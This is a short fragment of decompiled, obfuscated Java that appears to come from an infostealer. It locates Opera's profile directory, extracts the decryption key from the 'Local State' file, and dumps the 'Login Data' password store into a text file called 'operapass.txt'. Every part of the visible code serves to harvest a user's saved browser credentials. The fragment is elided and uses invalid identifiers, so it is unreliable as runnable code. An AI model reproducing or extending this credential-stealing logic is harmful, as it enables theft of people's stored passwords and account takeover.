...
public class 0e {
   ...
   private static final String 1 = System.getenv("APPDATA") + "\\Opera Software\\Opera Stable\\Default";
   ...
   private void _/* $FF was: 1*/() {
      ...
      byte[] key = this.0(new File(System.getenv("APPDATA") + "\\Opera Software\\Opera Stable\\Local State"));
      if (key != null) {
         File loginData = new File(userData, "Login Data");

         try {
            if (loginData.exists()) {
               this.0(loginData, key, "", "operapass.txt");
            }
